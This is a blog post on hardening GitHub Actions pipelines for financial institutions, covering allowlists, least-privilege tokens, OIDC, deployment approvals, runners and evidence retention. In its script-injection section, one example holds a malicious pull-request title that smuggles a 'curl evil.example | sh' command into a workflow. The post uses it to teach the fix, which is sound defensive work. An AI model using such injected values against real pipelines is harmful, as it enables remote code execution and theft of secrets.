---
layout: post
title: "GitHub Well-Architected for Financial Services, Part 6: CI/CD and GitHub Actions Hardening"
date: 2026-11-05 10:06:00 -0600
category: Blog
tags: [github, well-architected, financial-services, compliance, security, governance, github-actions, ci-cd, devops, supply-chain]
excerpt: "Your pipeline is remote code execution with production credentials, so here is how a regulated institution locks down GitHub Actions, separates deployment duties, and produces evidence an examiner will actually accept."
permalink: /blog/github-waf-financial-services/actions-hardening/
---

*This post is part of the [GitHub Well-Architected for Financial Services](/blog/github-waf-financial-services/) series.*

- [Series Overview and Compliance Crosswalk](/blog/github-waf-financial-services/)
- [Part 1: Platform Foundation and Data Boundaries](/blog/github-waf-financial-services/platform-foundation/)
- [Part 2: Identity and Access Management](/blog/github-waf-financial-services/identity-and-access/)
- [Part 3: Source Code Management and Change Control](/blog/github-waf-financial-services/change-control/)
- [Part 4: Secrets Protection](/blog/github-waf-financial-services/secrets-protection/)
- [Part 5: Code Scanning and Software Supply Chain](/blog/github-waf-financial-services/code-scanning-supply-chain/)
- **Part 6: CI/CD and GitHub Actions Hardening**
- [Part 7: Copilot and AI Agents](/blog/github-waf-financial-services/copilot-and-agents/)
- [The Leadership Brief (for CIOs, CISOs, and Senior Leaders)](/blog/github-waf-financial-services/leadership-brief/)

> **A friendly note:** This information is meant to be guidance to help navigate a complex topic. Please validate these patterns with your compliance and/or regulatory reporting team(s).

## Leadership brief

> - **The risk:** A CI/CD pipeline runs code from many sources and holds the keys to production. A single compromised third-party action, a careless workflow trigger, or a long-lived cloud credential can turn "build the app" into "exfiltrate the database."
> - **Our position:** Only approved, pinned actions run. Tokens default to read-only. Cloud access uses short-lived OIDC credentials bound to a protected environment. Production deployments need a second person, and nobody approves their own deployment.
> - **Runner posture:** GitHub-hosted runners by default, private networking for deployments into internal networks, and ephemeral self-hosted runners only where nothing else fits.
> - **The evidence:** Enterprise policy settings (exportable via API), audit log events for every approval, rejection, and policy change, deployment history per environment, and archived workflow logs that outlive GitHub's 400-day retention maximum.
> - **The ask:** Fund a small platform team to own the shared workflows, the action allowlist, and the runner fleet. This is a product, not a side project.

Picture the scene. It is quarter-end, a payments team is pushing a hotfix, and somebody copies a workflow snippet from a blog post (not this one, obviously). The snippet references a popular open source action by a floating tag. Three weeks ago, that tag was quietly repointed to a commit that ships environment variables to a server you have never heard of. Your workflow has a cloud deployment key in a repository secret. You can probably guess how the rest of the incident report reads.

The [GitHub Well-Architected Actions security guidance](https://learn.github.com/well-architected/library/application-security/recommendations/actions-security/) says it plainly: CI/CD tools "inherently provide remote code execution as a service." For a regulated institution, that puts your pipeline under the same scrutiny as any privileged production system: who can change it, what it runs, what credentials it holds, and whether you can prove it afterward.

Change control lives in [Part 3](/blog/github-waf-financial-services/change-control/), secrets in [Part 4](/blog/github-waf-financial-services/secrets-protection/), and attestations in [Part 5](/blog/github-waf-financial-services/code-scanning-supply-chain/). This part hardens the pipeline itself.

## The requirements

Regulations do not mention GitHub Actions by name (shocking, I know). They do describe outcomes that a pipeline either supports or undermines. These are the baselines most relevant to CI/CD hardening. Your organization decides how it meets or exceeds them.

| ID | Regulation and citation | What it asks for (paraphrase) |
|---|---|---|
| US-FFIEC-DAM | [FFIEC IT Examination Handbook, Development, Acquisition, and Maintenance](https://ithandbook.ffiec.gov/it-booklets/development-acquisition-and-maintenance) | Governance and risk management across building, buying, and maintaining software, including change management and vendor-sourced code. |
| US-FFIEC-INFOSEC | [FFIEC IT Examination Handbook, Information Security](https://ithandbook.ffiec.gov/it-booklets/information-security) | Controls that protect confidentiality, integrity, and availability, backed by governance and risk identification. |
| US-FFIEC-AIO | [FFIEC IT Examination Handbook, Architecture, Infrastructure, and Operations](https://ithandbook.ffiec.gov/it-booklets/architecture-infrastructure-and-operations) | Sound architecture, infrastructure (on-premises and cloud), and operations practices. |
| US-3PRM-2023 | [Interagency Guidance on Third-Party Relationships (OCC Bulletin 2023-17 / Fed SR 23-4)](https://www.occ.gov/news-issuances/bulletins/2023/bulletin-2023-17.html) | A risk-tiered lifecycle for third-party relationships: due diligence, contracting, monitoring, and termination. |
| CA-OSFI-B13 | [OSFI Guideline B-13, Technology and Cyber Risk Management](https://www.osfi-bsif.gc.ca/en/guidance/guidance-library/technology-cyber-risk-management) | Risk-based management of technology and cyber risk across governance, operations, resilience, and cybersecurity. |
| CA-AMF-ICT | [AMF Guideline on ICT Risk Management (Québec)](https://lautorite.qc.ca/en/professionals/insurers/guidelines/operational-risk/guideline-on-information-and-communications-technology-risk-management) | ICT governance and risk management lifecycle for AMF-regulated institutions. |
| MX-CNBV-CUB | [CNBV Circular Única de Bancos (Mexico)](https://www.cnbv.gob.mx/Normatividad/Disposiciones%20de%20car%C3%A1cter%20general%20aplicables%20a%20las%20instituciones%20de%20cr%C3%A9dito.pdf) | Technology risk, information security, operational risk, and IT outsourcing provisions for banks. |
| EU-DORA-9 | [DORA Art. 9, Protection and prevention](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32022R2554#art_9) | Continuous monitoring and control of ICT systems, with tools and policies that protect resilience, integrity, and confidentiality. |
| EU-DORA-RTS-CHANGE | [Commission Delegated Regulation (EU) 2024/1774, Art. 17 / Art. 38](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32024R1774) | ICT change management requirements under the full and simplified frameworks. |
| EU-DORA-28-30 | [DORA Arts. 28 to 30, ICT third-party risk](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32022R2554#art_28) | The financial entity stays fully responsible when using ICT third parties, with contractual and concentration-risk expectations. |
| INT-PCI-7.2 | [PCI DSS v4.0.1, Req. 7.2](https://www.pcisecuritystandards.org/document_library/) | Least-privilege, need-to-know access with documented models and periodic review. |
| INT-PCI-10.4 | [PCI DSS v4.0.1, Req. 10.4](https://www.pcisecuritystandards.org/document_library/) | Automated daily review of security event and critical system logs. |
| INT-PCI-12.8 | [PCI DSS v4.0.1, Req. 12.8](https://www.pcisecuritystandards.org/document_library/) | Maintain and monitor third-party service providers and their security responsibilities. |
| INT-SWIFT-CSCF-OVERVIEW | [SWIFT Customer Security Controls Framework (overview)](https://www.swift.com/myswift/customer-security-programme) | Secure your environment, know and limit access, detect and respond. |
| INT-NIST-SSDF | [NIST SP 800-218, Secure Software Development Framework](https://csrc.nist.gov/pubs/sp/800/218/final) | Secure development practices, including protecting build and distribution environments (PO.5). |

The common thread: **control what runs, limit what it can touch, separate who approves from who requests, and keep the receipts.**

## Deployment model differences

Most Actions controls behave the same everywhere. The differences that matter for this topic are runners, the OIDC issuer, and the newest policy features.

| Topic | GHEC (personal accounts) | GHEC with EMU | GHEC with data residency (GHE.com) | GHES |
|---|---|---|---|---|
| GitHub-hosted and larger runners | Yes | Yes | Yes (macOS runners [currently unavailable](https://docs.github.com/en/enterprise-cloud@latest/admin/data-residency/feature-overview-for-github-enterprise-cloud-with-data-residency)) | **Not supported**; self-hosted only ([docs](https://docs.github.com/en/enterprise-server@3.22/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/about-using-actions-in-your-enterprise)) |
| Azure private networking for hosted runners | Yes, larger runners only | Yes | Yes, but [supported regions differ](https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise) | N/A |
| OIDC issuer for cloud trust | `token.actions.githubusercontent.com` | Same | `token.actions.SUBDOMAIN.ghe.com` ([docs](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/oidc)) | `HOSTNAME/_services/token` ([docs](https://docs.github.com/en/enterprise-server@3.20/actions/reference/security/oidc)) |
| Public actions | Marketplace available | Same | Marketplace unavailable; some actions hard-code `api.github.com` | Requires GitHub Connect to use GitHub.com actions |
| Fork PRs from outside collaborators | Relevant for any public repos | Managed users cannot create public repos | No public repos | Relevant if instance allows public repos |
| SHA pinning policy | Yes | Yes | Yes | Yes ([GHES 3.20](https://docs.github.com/en/enterprise-server@3.20/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)) |
| Workflow execution protections and lockfiles | Yes | Yes | Documented for GHEC; confirm on GHE.com | Not in GHES 3.20 docs |
| Artifact attestations | Yes | Yes | Yes | Not available |
| Max retention for runs, artifacts, logs (private/internal) | 400 days | 400 days | 400 days | 400 days |

**Two practical callouts.** On GHE.com, update every cloud trust policy to the subdomain issuer before go-live. On GHES, every runner is self-hosted, so the ARC and runner group guidance below is mandatory.

## Control 1: Govern what code runs in the pipeline

### What we do

Set the enterprise policy to **Allow enterprise, and select non-enterprise, actions and reusable workflows**. Allow GitHub-authored actions, do not blanket-allow Marketplace "verified creators," and add third-party actions to an explicit allowlist after review. Turn on **Require actions to be pinned to a full-length commit SHA**. Host shared actions and reusable workflows in a dedicated internal organization.

### Why

Every third-party action is third-party code running with your token and secrets. The allowlist is therefore a third-party risk control (US-3PRM-2023, EU-DORA-28-30, INT-PCI-12.8) and a software acquisition control (US-FFIEC-DAM). The WAF [Actions security guidance](https://learn.github.com/well-architected/library/application-security/recommendations/actions-security/) recommends SHA pinning plus a central allowlist, which "makes it easy to respond to compromised actions without searching across repositories." The [scaling Actions reusability](https://learn.github.com/well-architected/library/collaboration/recommendations/scaling-actions-reusability/) recommendation adds the operating model: a dedicated organization, contribution guidelines, and quarterly reviews.

And the "verified creator" badge? Per the WAF guidance, it "is not a guarantee of security." It starts a review; it does not replace one.

### How

The [enterprise Actions policy](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise) supports allow and block patterns, including `!` prefixes to block a specific action. Manage it as code through the [REST API](https://docs.github.com/en/enterprise-cloud@latest/rest/actions/permissions) so every allowlist change goes through a pull request with an approver:

```bash
# Enterprise-wide: only selected actions, SHA pinning required
gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions \
  -f enabled_organizations=all \
  -f allowed_actions=selected \
  -F sha_pinning_required=true

# The allowlist itself lives in a reviewed repo as JSON
cat allowlist.json
# {
#   "github_owned_allowed": true,
#   "verified_allowed": false,
#   "patterns_allowed": [
#     "azure/login@*",
#     "aws-actions/configure-aws-credentials@*",
#     "!some-org/abandoned-action@*"
#   ]
# }
gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions/selected-actions \
  --input allowlist.json
```

Allowlist by repository and let the SHA pinning policy handle immutability. In workflows, pin to a SHA that corresponds to a tagged release and keep the version in a comment so Dependabot version updates still work:

```yaml
- uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
```

**Know the trade-off.** Pinned SHAs receive Dependabot version updates but, per the WAF guidance, not Dependabot security alerts for the action. Your quarterly allowlist review covers that gap.

**Newer option: workflow dependency lockfiles.** GitHub now documents [workflow dependency lockfiles](https://docs.github.com/en/enterprise-cloud@latest/actions/concepts/security/workflow-dependency-lockfiles): a `.github/workflows/actions.lock` file, generated by the `gh actions-lock` CLI extension, that pins every action (including transitive dependencies) and satisfies the SHA pinning policy for onboarded workflows. Caveats: lockfiles do not pin reusable workflow calls (use full SHAs), and tag-pinned allowlist entries like `actions/checkout@v6` do not match locked dependencies, so use `@*` or org wildcards. Pilot it on a few repositories and confirm its release status for your plan before making it a hard gate.

### Verify

- **Monthly:** Export `GET /enterprises/{enterprise}/actions/permissions` and `/selected-actions`. Diff against the approved JSON in your policy repo. Any drift is a finding.
- **Continuous:** Alert on the `business.update_actions_settings` audit log event, which records old and new policy values and the updated patterns ([audit log events](https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise)).
- **Quarterly:** Review every allowlisted third-party action: maintainer health, open advisories, and whether anyone still uses it.

## Control 2: Least-privilege GITHUB_TOKEN

### What we do

Set the enterprise default `GITHUB_TOKEN` permission to **read-only**. Keep **Allow GitHub Actions to create and approve pull requests** disabled. In workflows, declare `permissions: {}` at the top and grant scopes per job.

### Why

The token is an identity, and least privilege applies to identities (INT-PCI-7.2, US-FFIEC-INFOSEC). The WAF [Actions security guidance](https://learn.github.com/well-architected/library/application-security/recommendations/actions-security/) recommends a restricted default plus job-level permissions so "new jobs default to no permissions rather than inherited elevated permissions." Keeping Actions from approving pull requests protects the two-person review you built in [Part 3](/blog/github-waf-financial-services/change-control/). A bot approving its own PR is not separation of duties.

### How

Per the [enterprise policy docs](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#workflow-permissions), enterprises created on or after February 2, 2023 default to read-only. Older enterprises default to read and write. If your enterprise predates that, check this setting first.

```bash
gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions/workflow \
  -f default_workflow_permissions=read \
  -F can_approve_pull_request_reviews=false
```

In each workflow:

```yaml
permissions: {}   # nothing by default

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
      - run: make test
```

**Yes, but:** anyone with write access can still raise permissions in a workflow file, as the docs note. The default is a guardrail, not a wall. The wall is code review on `.github/workflows/**` (CODEOWNERS plus a ruleset, per [Part 3](/blog/github-waf-financial-services/change-control/)) and code scanning of workflow files, which [GitHub's secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) notes can detect vulnerable workflow patterns.

### Verify

- **Monthly:** `GET /enterprises/{enterprise}/actions/permissions/workflow` should return `"default_workflow_permissions": "read"` and `"can_approve_pull_request_reviews": false`.
- **Continuous:** Alert on `business.set_default_workflow_permissions`.
- **Quarterly:** Sample workflows across critical repositories for top-level `write-all` or broad write scopes.

## Control 3: OIDC to cloud providers, not stored credentials

### What we do

No long-lived cloud credentials in Actions secrets. Every deployment authenticates through [OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect). Production cloud roles trust only tokens whose subject includes the **production environment** and, where the provider supports it, a specific reusable workflow via `job_workflow_ref`.

### Why

A stored cloud key is a standing privilege that outlives the job, the developer, and occasionally the employer. With OIDC, the provider issues a short-lived token "only valid for a single job," per the docs. That supports least privilege (INT-PCI-7.2), protection of credentials in transit and use (EU-DORA-9), and secure build environments (INT-NIST-SSDF). The WAF [NIST SSDF implementation guide](https://learn.github.com/well-architected/library/scenarios/nist-ssdf-implementation/) lists OIDC as the first item under PO.5, "Implement and maintain secure environments."

### How

The job needs `id-token: write`. That permission only lets the job request an OIDC token; it does not grant write access to repository resources. Bind the cloud trust to the environment so the production role is unreachable until the environment's protection rules pass. Per the [OIDC reference](https://docs.github.com/en/actions/reference/security/oidc), a job that references an environment gets a subject like `repo:octo-org/octo-repo:environment:Production`.

**Mind the subject format.** Repositories created after July 15, 2026 use an **immutable** default subject that includes owner and repository IDs (for example `repo:octo-org@123456/octo-repo@456789:...`). Older repositories keep the name-based format unless you opt in at the org or repo level. Opt in. Immutable IDs mean a recycled repository name cannot inherit your cloud trust. (This rollout does not include GHES.)

For attribute-based access, GitHub can also include [repository custom properties](https://docs.github.com/en/actions/concepts/security/openid-connect#using-repository-custom-properties-as-oidc-claims) as `repo_property_*` claims. A claim like `repo_property_data_classification` lets your cloud policy say "only repos tagged PCI can assume the CDE deploy role."

### Verify

- **Monthly:** Secret scanning and a secrets inventory (see [Part 4](/blog/github-waf-financial-services/secrets-protection/)) should show zero cloud access keys in Actions secrets.
- **Quarterly:** Export cloud-side federated credential or trust policy configurations. Confirm no wildcards on `sub`, and that production roles match the environment and immutable IDs.
- **Continuous:** Cloud provider sign-in logs show workload identity sign-ins tied to the GitHub issuer. Correlate them with workflow run IDs in your SIEM.

## Control 4: Environments and separation of duties for deployments

### What we do

Every production deployment job references a `production` environment with:

- **Required reviewers** set to a release-approver team (not individuals).
- **Prevent self-review** enabled.
- **Allow administrators to bypass** disabled.
- **Deployment branches and tags** restricted to `main` and release tags.
- Environment-scoped secrets and variables only.

### Why

This is where change management stops being a document and becomes a gate. The requester and approver are different humans, the approval is recorded, and the deployment cannot start from an arbitrary branch. That maps to EU-DORA-RTS-CHANGE, US-FFIEC-DAM, CA-OSFI-B13, and MX-CNBV-CUB. The WAF [effective CI guidance](https://learn.github.com/well-architected/library/productivity/recommendations/effective-ci/) frames environments as "a useful boundary between CI and CD": keep CI fast and automatic, put governance on deployment.

### How

Per the [deployments and environments reference](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments):

- You can list up to six users or teams as required reviewers; only one needs to approve.
- **Prevent self-reviews** means "users who initiate a deployment cannot approve the deployment job, even if they are a required reviewer."
- By default, administrators can bypass protection rules. You can configure the environment to disallow bypass for all deployments.
- Environment secrets are unavailable to a job until a required reviewer approves it.
- Custom deployment protection rules (for example ServiceNow or Datadog gates) are **in public preview**. Useful for tying a change ticket to the deployment, but validate before relying on them.

A deploy job that ties it together:

{% raw %}
```yaml
name: release
on:
  push:
    tags: ['v*']

permissions: {}

jobs:
  deploy-production:
    runs-on:
      group: prod-deployers          # runner group, see Control 6
    environment: production          # reviewers, no self-review, no bypass
    permissions:
      contents: read
      id-token: write                # OIDC only, no stored keys
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
      - uses: azure/login@<full-length-sha> # vX.Y.Z (from your allowlist)
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
      - run: ./deploy/deploy.sh   # portable logic, see Control 9
```
{% endraw %}

**I know what you're thinking:** "Disabling admin bypass will hurt during an incident." Fair. That is why Control 9 defines a separate, audited break-glass path. An undocumented admin bypass is not a break-glass procedure; it is a finding waiting to happen.

### Verify

- **Per deployment:** `GET /repos/{owner}/{repo}/actions/runs/{run_id}/approvals` returns the review history for a run ([REST docs](https://docs.github.com/en/rest/actions/workflow-runs)). Pair it with `GET /repos/{owner}/{repo}/deployments?environment=production` ([deployments API](https://docs.github.com/en/rest/deployments/deployments)) for the full chain.
- **Continuous:** Stream `workflows.approve_workflow_job` and `workflows.reject_workflow_job`, plus `environment.update_protection_rule` and `environment.remove_protection_rule`, to your SIEM ([audit log events](https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise)).
- **Quarterly:** Sample production deployments and confirm approver differs from initiator. Report any environment protection change to change management.

```bash
# Who approved production deployments? (enterprise audit log)
gh api --method GET /enterprises/$ENTERPRISE/audit-log \
  -f phrase='action:workflows.approve_workflow_job' --paginate
```

## Control 5: Required workflows and workflow execution policies

### What we do

Use an org- or enterprise-level ruleset with **Require workflows to pass before merging** to run a centrally owned policy workflow on every pull request to protected branches. Use **workflow execution protections** to restrict who can trigger sensitive workflows and which events can run them.

### Why

Repository admins can edit their own workflows. A required workflow from a central repository cannot be quietly deleted by the team it governs. That is the difference between "we have a standard" and "we enforce a standard," which is the question auditors actually ask (US-FFIEC-DAM, EU-DORA-RTS-CHANGE, EU-DORA-9).

### How

Per the [available rules for rulesets](https://docs.github.com/en/enterprise-cloud@latest/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets#require-workflows-to-pass-before-merging):

- The workflow lives in a repository whose visibility matches the targets. Internal workflows run on internal and private repos.
- It must trigger on `pull_request`, `pull_request_target`, or `merge_group`. Branch and path filters are ignored.
- Start in **Evaluate** mode, then flip to **Active**.
- Ruleset workflows cannot use most CodeQL actions. Keep code scanning in default setup (see [Part 5](/blog/github-waf-financial-services/code-scanning-supply-chain/)) and use the required workflow for policy checks.

[Workflow execution protections](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/administer/control-workflow-execution) are configured under **Actions > Policies** at enterprise, org, or repo level. Per [About Actions policies](https://docs.github.com/en/enterprise-cloud@latest/actions/concepts/about-actions-policies), you get:

- **Actor rules:** separate who contributes code from who can run workflows.
- **Event rules:** allow or block events such as `pull_request_target` and `workflow_dispatch`.
- **Require lockfile:** block targeted workflows not onboarded to the lockfile.

Our starting policy: block `pull_request_target` enterprise-wide, restrict `workflow_dispatch` on deployment workflows to the release team, and run new policies in Evaluate mode for two weeks while you watch **Policy insights**.

### Verify

- **Continuous:** Alert on `workflows.actions_policy_violation` and on `repository_ruleset.update` or `repository_ruleset.destroy`.
- **Monthly:** Export rulesets and execution policies through the REST API and diff against your policy repo.

## Control 6: Runner strategy

### What we do

| Workload | Runner choice | Why |
|---|---|---|
| CI on pull requests | Standard GitHub-hosted | Ephemeral, isolated VM per job, zero patching |
| Deployments to private networks (Azure, or on-premises via ExpressRoute/VPN) | Larger runners with Azure private networking | Private connectivity, no inbound ports, runner groups for access control |
| Specialized hardware, air-gapped, or GHES | Ephemeral self-hosted via ARC | Only when hosted options cannot meet the need |
| Anything | Persistent self-hosted runners | **No.** Not for production pipelines. |

At the enterprise level, disable repository-level self-hosted runners. Put every non-standard runner in a runner group restricted to specific organizations, repositories, and (for production) **selected workflows**.

### Why

Runners are the build environment that INT-NIST-SSDF PO.5 asks you to protect, and they sit inside your network perimeter (INT-SWIFT-CSCF-OVERVIEW, US-FFIEC-AIO). GitHub-hosted runners are also a third-party service, so include them in your third-party inventory (US-3PRM-2023, EU-DORA-28-30, INT-PCI-12.8).

The [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners) states that hosted runners use "ephemeral and clean isolated virtual machines," while self-hosted runners "can be persistently compromised by untrusted code in a workflow." The WAF [hosted runner private networking](https://learn.github.com/well-architected/library/architecture/recommendations/hosted-runner-private-networking/) recommendation calls Azure private networking "the most comprehensive solution for private network access" among the options it compares.

### How

- **Azure private networking:** available only for larger runners (2 to 64 vCPU Ubuntu and Windows) and requires dynamic IPs ([docs](https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)). You control outbound network policy and can monitor runner network logs. The WAF page includes a Terraform library to get started.
- **ARC:** [Actions Runner Controller](https://docs.github.com/en/actions/concepts/runners/actions-runner-controller) runs ephemeral runner scale sets on Kubernetes. GitHub [recommends ephemeral runners for autoscaling](https://docs.github.com/en/actions/reference/runners/self-hosted-runners). The WAF [ARC guidance](https://learn.github.com/well-architected/library/architecture/recommendations/deploying-actions-runner-controller/) is blunt: you own cluster security, ARC adds none beyond Kubernetes, use dedicated clusters, avoid spot instances, and keep a Kubernetes expert on the team. Separate clusters also create separate security boundaries.
- **Runner groups:** per the [runner group docs](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/manage-runners/self-hosted-runners/manage-access), you can restrict a group to selected workflows, for example "restricting a runner group to run only a specific reusable workflow." That is how the `prod-deployers` group in Control 4 stays exclusive to your approved deployment workflow.
- **Optional hard line:** the enterprise policy can [disable standard hosted runners](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#disabling-standard-hosted-runners) so every job targets a governed runner group. Heavy-handed for most, but some CDE programs want it.

### Verify

- **Monthly:** `GET /enterprises/{enterprise}/actions/permissions/self-hosted-runners` confirms repo-level runners are disabled. Export runner groups and their repository and workflow access lists.
- **Continuous:** Alert on `org.runner_group_updated`, `org.runner_group_runners_added`, and any `org.self_hosted_runner_online` event from a runner you do not recognize.
- **Quarterly:** Confirm runner images and ARC are current. Self-hosted runners on GHEC must stay within 30 days of the latest runner release, per the WAF ARC guidance.

## Control 7: Untrusted input (fork PRs, pull_request_target, and script injection)

### What we do

- Require approval for **all outside collaborators** before fork PR workflows run.
- In private and internal repositories, do not send write tokens or secrets to fork PR workflows, and require approval for fork PR workflows.
- Block `pull_request_target` by default. Grant exceptions per workflow, after security review.
- Never interpolate {% raw %}`${{ }}`{% endraw %} expressions from user-controlled fields directly into `run:` blocks.

### Why

Attackers do not need repository access if your workflow runs their code with your secrets. This is integrity protection (EU-DORA-9, US-FFIEC-INFOSEC) and secure development practice (INT-NIST-SSDF).

### How

**Fork approvals.** The [enterprise policy](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#fork-pull-request-workflows-from-outside-collaborators) offers three levels. The docs warn that first-time-contributor settings can be gamed by landing "a simple typo" fix first. Choose **all outside collaborators**. Also note: workflows triggered by `pull_request_target` "will always run, regardless of approval settings."

```bash
gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions/fork-pr-contributor-approval \
  -f approval_policy=all_external_contributors

gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions/fork-pr-workflows-private-repos \
  -F run_workflows_from_fork_pull_requests=true \
  -F send_write_tokens_to_workflows=false \
  -F send_secrets_and_variables=false \
  -F require_approval_for_fork_pr_workflows=true
```

**pull_request_target.** Per [Securely using pull_request_target](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/securely-using-pull_request_target), the event runs with the base repository's token and secrets. It is safe until someone checks out the PR head and executes it, the classic "pwn request." GitHub has added a default policy that blocks `pull_request_target` in public repositories, enforced on **December 2, 2026**. It does not apply to private or internal repos, so set your own event policy (Control 5). Treat `workflow_run` artifacts as untrusted too, as the WAF guidance advises.

**Script injection.** Here is the bug, and the fix from the [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks):

{% raw %}
```yaml
# Vulnerable: a PR title like a"; curl evil.example | sh; " becomes shell code
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Safer: pass through an intermediate environment variable
- name: Check PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $TITLE"
```
{% endraw %}

### Verify

- **Monthly:** Export the two fork PR policy endpoints above. Alert on `business.set_actions_fork_pr_approvals_policy` and `business.set_actions_private_fork_pr_approvals_policy`.
- **Continuous:** Code scanning alerts on workflow files (see [Part 5](/blog/github-waf-financial-services/code-scanning-supply-chain/)) should be triaged within your vulnerability SLA.
- **Quarterly:** Search the codebase for `pull_request_target` and confirm each hit has a documented exception.

## Control 8: Retention, logs, and attestations as evidence

### What we do

Set retention for private and internal repositories to the **400-day maximum**. Stream the audit log to your SIEM. Archive workflow run logs and deployment records for production pipelines to your own immutable storage. Generate artifact attestations for everything you deploy.

### Why

Here is the part that bites people: per the [enterprise policy docs](https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#artifact-and-log-retention), starting October 1, 2026, the retention policy also covers **checks, workflow runs, and commit statuses**, not just artifacts and logs. The default is 90 days. If you never changed it, your workflow run history is now on a 90-day clock. Review the setting today.

Most FSI record retention requirements run longer than 400 days. GitHub is not your system of record for pipeline evidence; your archive is. This supports log review (INT-PCI-10.4), monitoring (EU-DORA-9), and the "show me" part of every exam.

### How

```bash
# Max retention for private/internal repos
gh api -X PUT /enterprises/$ENTERPRISE/actions/permissions/artifact-and-log-retention \
  -F days=400

# Archive a production run's logs (run from a scheduled export job)
gh api /repos/$OWNER/$REPO/actions/runs/$RUN_ID/logs > "run-$RUN_ID-logs.zip"
gh api /repos/$OWNER/$REPO/actions/runs/$RUN_ID/approvals > "run-$RUN_ID-approvals.json"
```

Note that `workflows.completed_workflow_run` is available only via the REST API, audit log streaming, or exports, not in the web UI. Streaming is the reliable path.

**Attestations.** [Artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations) record the workflow, repository, commit SHA, environment, and triggering event for a build, and provide SLSA v1.0 Build Level 2 on their own. [Part 5](/blog/github-waf-financial-services/code-scanning-supply-chain/) covers generation and verification. The CI/CD angle: verify the attestation at deploy time, and archive the attestation bundle with the artifact so you can [verify offline](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/secure-your-work/use-artifact-attestations/verify-attestations-offline) later. Attestations are not available on GHES.

### Verify

- **Monthly:** `GET .../artifact-and-log-retention` returns 400. Alert on `business.set_actions_retention_limit`.
- **Monthly:** Reconcile production deployments in GitHub against your archive. Every deployment should have logs, approvals, and an attestation on file.
- **Daily (automated):** SIEM rules review Actions audit events, satisfying the automated-review expectation in INT-PCI-10.4.

## Control 9: Resilience of CI/CD

### What we do

For critical workloads, keep deployment logic in versioned scripts that the workflow calls, maintain an alternate, audited invocation path with its own short-lived identity, and rehearse it.

### Why

Operational resilience regulators (EU-DORA-9, CA-OSFI-B13, US-FFIEC-AIO) care whether you can deploy a fix when a dependency is down. "We'll wait for the status page to go green" is not a continuity plan.

### How

The WAF [designing resilient CI/CD](https://learn.github.com/well-architected/library/architecture/recommendations/designing-resilient-ci-cd/) recommendation lays out the pattern:

1. **Keep deployment logic portable.** YAML should not be the only executable form of a critical deployment.
2. **Preserve deployment inputs:** approved artifacts, immutable release IDs, tooling, and attestation bundles with trust material.
3. **Maintain a separate authentication path** with a distinct, short-lived identity that does not depend on GitHub Actions. No permanent break-glass credentials.
4. **Detect what failed** using the GitHub Status API, and do not switch paths if the same downstream failure affects both.
5. **Reconcile before replaying,** and revoke temporary access.
6. **Rehearse** the alternate path periodically.

Alternate paths need "equivalent verification, approval, and audit controls," per the guide. Break-glass still means two people and a log. For source continuity, see the WAF [repository mirroring](https://learn.github.com/well-architected/library/architecture/recommendations/building-resilience-with-repository-mirroring/) pattern.

### Verify

- **Semi-annually (or per your BCM schedule):** Run a tabletop or live rehearsal. Keep the record: who activated, what was deployed, approvals, and reconciliation.
- **After each use:** Confirm temporary credentials were revoked and the deployment was reconciled into normal history.

## Control matrix

| Control | Requirement IDs | GitHub feature | Evidence | Cadence |
|---|---|---|---|---|
